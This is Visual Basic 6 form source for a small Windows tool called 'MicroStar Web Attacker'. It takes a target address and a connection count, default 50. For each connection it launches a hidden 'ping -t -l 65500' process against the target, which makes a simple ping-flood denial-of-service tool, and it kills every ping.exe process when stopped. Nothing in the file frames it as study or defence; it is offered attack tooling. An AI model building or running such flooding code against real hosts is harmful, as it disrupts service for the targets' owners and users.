VERSION 5.00
Begin VB.Form form1 
   BorderStyle     =   0  'None
   Caption         =   "MicroStar Web Attacker"
   ClientHeight    =   3645
   ClientLeft      =   5295
   ClientTop       =   3180
   ClientWidth     =   4845
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":08CA
   ScaleHeight     =   3645
   ScaleWidth      =   4845
   Begin VB.TextBox txtConnections 
      Alignment       =   2  'Center
      BeginProperty DataFormat 
         Type            =   0
         Format          =   "0"
         HaveTrueFalseNull=   0
         FirstDayOfWeek  =   0
         FirstWeekOfYear =   0
         LCID            =   1033
         SubFormatType   =   0
      EndProperty
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   420
      Left            =   2330
      TabIndex        =   1
      Text            =   "50"
      Top             =   1960
      Width           =   855
   End
   Begin VB.TextBox txtPing 
      Alignment       =   2  'Center
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   420
      Left            =   1560
      TabIndex        =   0
      Top             =   1260
      Width           =   2655
   End
   Begin VB.Image minimize 
      Height          =   315
      Left            =   4080
      Picture         =   "Form1.frx":1207E
      Top             =   0
      Width           =   390
   End
   Begin VB.Image exit 
      Height          =   315
      Left            =   4505
      Picture         =   "Form1.frx":179B3
      Top             =   0
      Width           =   360
   End
   Begin VB.Image about_us 
      Height          =   615
      Left            =   3240
      Picture         =   "Form1.frx":1D311
      Top             =   2880
      Width           =   1470
   End
   Begin VB.Image stop 
      Height          =   630
      Left            =   1680
      Picture         =   "Form1.frx":23BE5
      Top             =   2880
      Width           =   1485
   End
   Begin VB.Image start 
      Height          =   630
      Left            =   120
      Picture         =   "Form1.frx":2A42F
      Top             =   2880
      Width           =   1470
   End
End
Attribute VB_Name = "form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SendMessage Lib "User32" Alias "SendMessageA" (ByVal hWnd As Long, _
 ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long

Private Declare Sub ReleaseCapture Lib "User32" ()

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Const WM_NCLBUTTONDOWN = &HA1
    Const HTCAPTION = 2
    If Button = 1 Then
        ReleaseCapture
        SendMessage Me.hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
    End If
End Sub
Private Sub about_us_Click()
form1.Enabled = False
Form2.Show
End Sub

Private Sub exit_Click()
Call TerminateProcess("ping.exe")
End
End Sub
Private Sub minimize_Click()
form1.WindowState = vbMinimized
End Sub

Private Sub Start_Click()
ans = MsgBox("It can take time to load the connections !!! Please wait...", vbOKOnly, "Notice")
X = txtConnections.Text
For Connect = 1 To X
Call attack
Next Connect
End Sub
Private Sub Stop_Click()
ans = MsgBox("Please wait until program will stop connections", vbOKOnly, "Notice")
Call TerminateProcess("ping.exe")
End Sub

Private Sub TerminateProcess(ByVal app_exe As String)
    Dim Process As Object
    For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & app_exe & "'")
        Process.Terminate
    Next Process
End Sub
Private Sub attack()
lret = Shell("cmd /c ping -t -l 65500 " & txtPing.Text, vbHide)
End Sub
Private Sub txtconnections_KeyPress(KeyAscii As Integer)
    If (KeyAscii <= 48 Or KeyAscii >= 57) Then
        If Not (KeyAscii = 46 Or KeyAscii = 8) Then
            MsgBox "Only numbers are allowed", vbOKOnly, "!"
            KeyAscii = 0
        End If
    End If
End Sub
